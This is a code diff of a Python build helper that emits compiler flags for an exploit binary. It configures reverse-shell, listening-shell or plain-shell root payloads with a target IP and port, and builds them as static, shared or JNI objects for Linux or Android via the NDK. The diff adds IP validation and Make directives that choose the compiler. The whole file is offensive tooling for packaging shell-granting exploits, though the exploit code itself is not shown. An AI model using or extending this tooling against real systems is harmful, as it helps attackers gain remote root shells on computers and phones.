@@ -1,10 +1,12 @@
 #!/usr/bin/env python
 
 import argparse
-import sys
+import ipaddress
 import os
+import sys
 
-def main():
+
+def main() -> None:
     parser = argparse.ArgumentParser(
         prog='payload-flags',
         description='Generates CFLAGS for exploit binary',
@@ -12,7 +14,7 @@ def main():
 
     entrypoint_group = parser.add_mutually_exclusive_group(required=True)
     payload_group = parser.add_mutually_exclusive_group(required=True)
-    target_group = parser.add_mutually_exclusive_group(required=True)
+    target_group = parser.add_mutually_exclusive_group()
 
     entrypoint_group.add_argument('--static', action='store_true', help='Build binary as static executable')
     entrypoint_group.add_argument('--binary', action='store_true', help='Build binary as regular executable')
@@ -23,11 +25,13 @@ def main():
     payload_group.add_argument('--listening-shell', action='store_true')
     payload_group.add_argument('--shell', action='store_true')
 
-    target_group.add_argument('--linux', action='store_true', help='Build binary with host c compiler for regular linux', default=True)
-    target_group.add_argument('--android', action='store_true', help='Build with android ndk for running on phone', default=False)
+    target_group.add_argument('--linux', action='store_true', help='Build binary with host c compiler for regular linux')
+    target_group.add_argument('--android', action='store_true', help='Build with android ndk for running on phone')
 
     parser.add_argument('--ip', help='IP address for reverse shell to connect to')
     parser.add_argument('--port', type=int, help='Port for listning shell and reverse shell')
+    parser.add_argument('--make', action='store_true',
+                        help='Emit make eval directives which also select the compiler')
 
     args = parser.parse_args()
 
@@ -37,26 +41,33 @@ def main():
     if args.reverse_shell and args.ip is None:
         parser.error('--ip required')
 
+    if args.reverse_shell:
+        try:
+            ipaddress.IPv4Address(args.ip)
+        except ipaddress.AddressValueError:
+            parser.error('--ip must be an IPv4 address')
+
     if args.shell:
         flags = ''
     elif args.listening_shell:
         flags = f'-DLISTENING_SHELL -DROOT_PAYLOAD_PORT={args.port} '
     elif args.reverse_shell:
-        flags = f'-DREVERSE_SHELL -DROOT_PAYLOAD_PORT={args.port} -DROOT_PAYLOAD_IP={args.ip}'
+        flags = (f'-DREVERSE_SHELL -DROOT_PAYLOAD_PORT={args.port} '
+                 f'-DROOT_PAYLOAD_IP=\'"{args.ip}"\' ')
 
     if args.static:
-        flags += '-static -fno-pie -DEXPLOIT_STATIC'
+        flags += '-static -fno-pie -DEXPLOIT_STATIC -DEXPLOIT_STATIC_LINKED'
     elif args.binary:
         flags += '-DEXPLOIT_STATIC'
     elif args.shared:
-        flags += '-shared -llog -DEXPLOIT_SHARED'
+        flags += '-shared -DEXPLOIT_SHARED'
     elif args.jni:
-        flags += '-shared -llog -DEXPLOIT_JNI'
+        flags += '-shared -DEXPLOIT_JNI'
 
-    if args.linux:
-        cc = 'gcc'
-        cxx = 'g++'
-    else:
+    if (args.shared or args.jni) and args.android:
+        flags += ' -llog'
+
+    if args.android:
         ndk_path = os.environ.get('ANDROID_NDK_HOME')
         if ndk_path is None:
             print('Error: ANDROID_NDK_HOME env var must be set to build for android')
@@ -65,9 +76,16 @@ def main():
         # TODO: support android arm32 if needed
         cc = f'{ndk_path}/toolchains/llvm/prebuilt/linux-x86_64/bin/aarch64-linux-android30-clang'
         cxx = f'{cc}++'
+    else:
+        cc = 'gcc'
+        cxx = 'g++'
 
     common_dir = os.path.dirname(os.path.abspath(sys.argv[0]))
-    print(f'-I{common_dir} {flags}')
+    if args.make:
+        print(f'$(eval CCFLAGS += -I{common_dir} {flags}) $(eval CC := {cc}) $(eval CXX := {cxx})')
+    else:
+        print(f'-I{common_dir} {flags}')
+
 
 if __name__ == '__main__':
     main()
